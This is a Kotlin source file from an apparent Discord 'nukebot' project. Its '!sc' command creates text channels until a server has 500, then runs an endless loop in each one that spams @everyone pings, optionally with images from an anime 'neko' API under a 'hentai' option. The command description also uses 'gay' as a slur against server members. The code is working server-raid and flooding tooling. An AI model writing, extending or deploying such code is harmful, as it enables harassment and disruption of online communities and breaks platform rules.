package thenano.nukebot.bot.command.commands

import com.google.gson.JsonObject
import com.google.gson.JsonParser
import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.entities.Channel
import net.dv8tion.jda.api.entities.MessageChannel
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import thenano.nukebot.bot.command.CommandListener
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.net.URL
import java.util.concurrent.TimeUnit


@CommandListener.Info("!sc <tag(true/false/hentai)> <channelName> <contents>","Create lots of channel and tag all gay in this server",false)
class SpamChannel : CommandListener() {

    @Throws(RuntimeException::class)
    override fun onEvent(event: MessageReceivedEvent) {
        if (onInit(event)) return
        if (message.contentRaw.startsWith("!sc")) {
            if (self.hasPermission(Permission.MANAGE_CHANNEL)) {
                try {
                    val index = messageRaw.indexOf(" ")
                    val index2 = messageRaw.indexOf(" ", index + 1)
                    val index3 = messageRaw.indexOf(" ",index2+ 1)
                    val tag = messageRaw.substring(index + 1, index2)
                    val content = messageRaw.substring(index2 + 1,index3)
                    val content2 = messageRaw.substring(index3+1)

                    val channelThread = Thread(ChannelThread(content,content2,tag))
                    channelThread.start()
                } catch (e: StringIndexOutOfBoundsException) {}
            }
        }
    }

    class ChannelThread(content: String,val content2: String,val tag: String) : Runnable {
        var c = content
        override fun run() {
            var i = 0
            while (guild.channels.size < 500) {
                i++
                try {
                    val channel = guild.createTextChannel(c).completeAfter(100, TimeUnit.MILLISECONDS)
                    val tagThread = Thread(TagThread(channel,content2,tag))
                    tagThread.start()
                } catch (_:Exception) {
                }
                //println("Created Channel { name=" + c + ",count=" + i + "}")
            }
        }
    }

    class TagThread(val channel: Channel,content: String, val tag: String) : Runnable {
        var c = content
        private val PARSER = JsonParser()
        override fun run() {
            while (true) {
                val message:String = c
                if (tag.equals("hentai")) {
                    try {
                        val s = downloadWebPage("https://nekos.life/api/v2/img/neko")
                        val json: JsonObject = PARSER.parse(s).asJsonObject
                        val out = json.get("url").asString
                        (channel as MessageChannel).sendMessage("@everyone ${message + " " + out}").completeAfter(100,TimeUnit.MILLISECONDS)
                    } catch (e:IOException) {
                        e.printStackTrace()
                    }
                } else if (tag.equals("true")){
                    (channel as MessageChannel).sendMessage("@everyone $c").completeAfter(100,TimeUnit.MILLISECONDS)
                } else {
                    (channel as MessageChannel).sendMessage(c).complete()
                }
            }
        }

        @Throws(IOException::class)
        private fun downloadWebPage(url: String): String {
            val result = StringBuilder()
            var line: String?

            // add user agent
            val urlConnection = URL(url).openConnection()
            urlConnection.addRequestProperty("User-Agent", "Mozilla/6.6")
            urlConnection.readTimeout = 5000
            urlConnection.connectTimeout = 5000
            urlConnection.getInputStream().use { `is` ->
                BufferedReader(InputStreamReader(`is`)).use { br ->
                    while (br.readLine().also {
                            line = it
                        } != null) {
                        result.append(line)
                    }
                }
            }
            return result.toString()
        }

    }


}